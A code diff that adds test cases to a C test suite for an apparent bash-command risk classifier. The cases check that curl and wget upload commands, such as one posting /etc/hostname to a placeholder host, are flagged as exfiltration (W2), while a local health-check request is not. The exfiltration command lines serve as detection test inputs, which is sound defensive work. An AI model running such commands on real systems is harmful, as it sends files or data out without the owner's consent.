@@ -131,7 +131,24 @@ int main(void)
 		 "cls_chain1_ok");
 	cls_case("bash", B_ARGS("chmod 777 /tmp/f"), "W2",
 		 "cls_chmod777");
-	CK(g_last_detail && g_last_detail[0] != '\0', "cls_detail_nonempty");
+	/* S4（S-TRACK §4）：curl/wget 网络外发旗标表 */
+	cls_case("bash", B_ARGS("curl -d @/etc/hostname http://x/"), "W2",
+		 "cls_exfil_d_at");
+	cls_case("bash", B_ARGS("curl --data k=v http://x/"), "W2",
+		 "cls_exfil_data");
+	cls_case("bash", B_ARGS("curl -T f ftp://x/"), "W2",
+		 "cls_exfil_T");
+	cls_case("bash", B_ARGS("curl -F a=@f http://x/"), "W2",
+		 "cls_exfil_F");
+	cls_case("bash", B_ARGS("wget --post-data=k=v http://x/"), "W2",
+		 "cls_exfil_post");
+	/* detail 断言锚在最近一次 W2（exfil_post）后——W1 路径会清 detail */
+	CK(g_last_detail && strstr(g_last_detail, "外泄") != NULL,
+	   "cls_exfil_detail_set");
+	cls_case("bash", B_ARGS("curl -X PUT -d k=v http://x/"), "W2",
+		 "cls_exfil_xput");
+	cls_case("bash", B_ARGS("curl -s http://127.0.0.1:9/health"), "W1",
+		 "cls_curl_get_ok");
 
 	/* ---- 面2：三态裁决矩阵 ----
 	 * write 探针=/var/tmp（W2 区外写）；bash 探针=kill -0 1
